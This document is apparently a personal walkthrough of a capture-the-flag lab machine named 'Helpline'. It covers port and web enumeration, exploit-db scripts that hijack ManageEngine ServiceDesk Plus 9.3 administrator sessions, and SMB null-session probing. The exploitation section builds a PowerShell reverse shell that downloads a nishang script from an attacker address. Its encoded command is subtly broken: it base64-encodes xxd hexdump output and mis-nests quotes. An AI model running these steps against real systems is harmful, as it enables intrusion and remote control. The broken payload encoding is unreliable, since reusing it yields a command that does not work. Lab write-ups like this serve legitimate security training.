#Helpline
#


1-Enumeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.96.159 -v
        PORT     STATE SERVICE       VERSION
        135/tcp  open  msrpc         Microsoft Windows RPC
        445/tcp  open  microsoft-ds?
        8080/tcp open  http-proxy 

        Host script results:
        | smb2-time: 
        |   date: 2025-01-28T18:19:00
        |_  start_date: N/A
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled but not required <--------------------- SMB Exploit

        Enumeration with -p- flag:
        5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0


        Port 8080:
            nikto -h http://10.129.96.159:8080
                OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
                /servlet/com.unify.servletexec.UploadServlet: This servlet allows attackers to upload files to the server.
                 /_mem_bin/auoconfig.asp: LDAP information revealed via asp. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt
                 /servlet/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0104
                + /servlet/sunexamples.BBoardServlet: This default servlet lets attackers execute arbitrary commands.
                + /servlet/SessionManager: IBM WebSphere reconfigure servlet (user=servlet, password=manager). All default code should be removed from servers.

                + /mc/: This might be interesting: potential country code (Monaco).
                + /wp-app.log: Wordpress' wp-app.log may leak application/system details.
                + /wordpress/wp-app.log: Wordpress' wp-app.log may leak application/system details.
                + /cfg/CFGConnectionParams.txt: Caremark Carestream config file found. May include account information and host data.

            gobuster dir -u http://10.129.96.159:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                /servlet              (Status: 200) [Size: 9399]
                /app                  (Status: 200) [Size: 9399]
                /mc                   (Status: 302) [Size: 0] [--> http://10.129.96.159:8080/mc/]
                /sd                   (Status: 302) [Size: 0] [--> http://10.129.96.159:8080/sd/]
                /cmdb                 (Status: 302) [Size: 0] [--> http://10.129.96.159:8080/cmdb/]
                /ntlmv2               (Status: 200) [Size: 0]
                http://10.129.96.159:8080/servlet/Select2Servlet?SkipNV2Filter=true

             	http://10.129.96.159:8080/servlet/:
                    ManageEngine ServiceDesk Plus  |  9.3

                http://10.129.96.159:8080/mc/j_security_check


            There is one exploit available for this version:
                ManageEngine ServiceDesk Plus 9.3 - User Enumeration | java/webapps/46674.txt
                └──╼ [★]$ sudo nano /usr/share/exploitdb/exploits/java/webapps/46674.txt


            We try to login with guest:guest after redirection we found the HomePage:
                http://10.129.96.159:8080/HomePage.do

                https://www.exploit-db.com/exploits/46674

            We test a request:
                http://10.129.96.159:8080/mc/WorkOrder.do?woID=11&mode=viewWO&more=details&isOverDue=false

            We found a creation form:
                http://10.129.96.159:8080/WorkOrder.do?reqTemplate=61

            We found Username in Password Audit File:
                http://10.129.96.159:8080/AddSolution.do?submitaction=viewsolution&fromListView=true&solutionID=8

                Luis Ribeiro:
                    AuditFile.xlsx permission: - View Type	Public	Status	Approved

                In the file we founds:
                        Local accounts (shadow admins)	1
                        Shared Passwords	2
                        Excessive Permissions	0
                        Weak Passwords	4


            We found a file "MegaBank Remote Access Procedure":
                "1. Open remoteaccess.megabank.com in a web browser (Chrome or Internet Explorer are supported)
                2.  Input your Windows username (doesn't require the "domain\" prefix - and your Windows password
                3. Input your assigned four digit code when prompted (this is your employee number)
                4. You can use the file manager to access network shares, and the email icon to access individual and team mailboxes
                5. The Internet Explorer icon can be used to access internal websites such as the reporting portal

                Please call the helpdesk if you encounter any issues logging in, we will always ask for your phone extension and line manager, in order to verify your identity."


        Exploiting 8080:
            We found a CVE with a python script that will allow us to get some privileges cookies and sessions ids:
                https://www.exploit-db.com/exploits/46659
                46659.py 
                JSESSIONID=C3D6569D7033DDB19957D210CE816C36
                JSESSIONIDSSO=2C44F94B6A8F699C51FCF1AC37D3270C
                febbc30d=4ab648d261004a899f468a892720fc09
                mesdpb60577db27=0158ce144871796cf9f3af81e8a5404228c77caa
                _rem=true

                *After running the script, it will output you the cookies that you can set on your browser to login to the high_username without password.

                Now we are Administrator in the console pannel:
                    http://10.129.96.159:8080/HomePage.do
                    administrator


                We generate an API Key that never expire:
                    API Key : 920D6AA2-6893-423C-8DF7-EFF010337DE5

                    	Name  CI Type  Login Name  E-Mail  Department Name  Site  Phone  Mobile  Job title  Employee ID  First Name  Middle Name  Last Name 
                        administrator
                        Technician 	administrator 	  	- 	- 	1234455 	1234567890 	  	009 	  	  	 
                        
                        Luis Ribeiro
                        Technician 	luis_21465 	luis.ribeiro@megabank.com 	- 	- 	  	  	  	4364 	Luis 	  	Ribeiro
                        
                        Zachary Moore
                        Technician 	zachary_33258 	zachary.moore@megabank.com 	- 	- 	  	  	  	3264 	Zachary 	  	Moore 


            We found a way to get a remote shell via the "Custom Trigger" in the CONFIGURATION WIZARD pannel:
                Powershell reverse shell:
                    └──╼ [★]$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
                    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.244 -Port 4443

                Then we start a http.server and upload the ps1 script to the Admin Trigger Task we will reduce the size:
                    in our Kali:
                        echo -n 'IEX(New-Object Net.WebClient).downloadString('http://10.10.14.244:443/Invoke-PowerShellTcp.ps1')' | iconv -t UTF-16LE |xxd | base64 -w 0


            We Name a Trigger Task: Shell

            and we add to the execution script:
                cmd /c powershell -nop -enc MDAwMDAwMDA6IDQ5MDAgNDUwMCA1ODAwIDI4MDAgNGUwMCA2NTAwIDc3MDAgMmQwMCAgSS5FLlguKC5OLmUudy4tLgowMDAwMDAxMDogNGYwMCA2MjAwIDZhMDAgNjUwMCA2MzAwIDc0MDAgMjAwMCA0ZTAwICBPLmIuai5lLmMudC4gLk4uCjAwMDAwMDIwOiA2NTAwIDc0MDAgMmUwMCA1NzAwIDY1MDAgNjIwMCA0MzAwIDZjMDAgIGUudC4uLlcuZS5iLkMubC4KMDAwMDAwMzA6IDY5MDAgNjUwMCA2ZTAwIDc0MDAgMjkwMCAyZTAwIDY0MDAgNmYwMCAgaS5lLm4udC4pLi4uZC5vLgowMDAwMDA0MDogNzcwMCA2ZTAwIDZjMDAgNmYwMCA2MTAwIDY0MDAgNTMwMCA3NDAwICB3Lm4ubC5vLmEuZC5TLnQuCjAwMDAwMDUwOiA3MjAwIDY5MDAgNmUwMCA2NzAwIDI4MDAgNjgwMCA3NDAwIDc0MDAgIHIuaS5uLmcuKC5oLnQudC4KMDAwMDAwNjA6IDcwMDAgM2EwMCAyZjAwIDJmMDAgMzEwMCAzMDAwIDJlMDAgMzEwMCAgcC46Li8uLy4xLjAuLi4xLgowMDAwMDA3MDogMzAwMCAyZTAwIDMxMDAgMzQwMCAyZTAwIDMyMDAgMzQwMCAzNDAwICAwLi4uMS40Li4uMi40LjQuCjAwMDAwMDgwOiAzYTAwIDM0MDAgMzQwMCAzMzAwIDJmMDAgNDkwMCA2ZTAwIDc2MDAgIDouNC40LjMuLy5JLm4udi4KMDAwMDAwOTA6IDZmMDAgNmIwMCA2NTAwIDJkMDAgNTAwMCA2ZjAwIDc3MDAgNjUwMCAgby5rLmUuLS5QLm8udy5lLgowMDAwMDBhMDogNzIwMCA1MzAwIDY4MDAgNjUwMCA2YzAwIDZjMDAgNTQwMCA2MzAwICByLlMuaC5lLmwubC5ULmMuCjAwMDAwMGIwOiA3MDAwIDJlMDAgNzAwMCA3MzAwIDMxMDAgMjkwMCAgICAgICAgICAgIHAuLi5wLnMuMS4pLgo=

                


        Port 445:

            └──╼ [★]$ enum4linux -u "guest" -p "" 10.129.96.159

            ──╼ [★]$ cme smb 10.129.96.159 -u " -p" : NULL SESSION:
                SMB         10.129.96.159   445    HELPLINE         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HELPLINE) (domain:HELPLINE) (signing:False) (SMBv1:False)


            cme smb 10.129.96.159 -u'a' -p

            └──╼ [★]$ smbclient -U '' -L//10.129.96.159
                Password for [WORKGROUP\]:
                session setup failed: NT_STATUS_LOGON_FAILURE


    



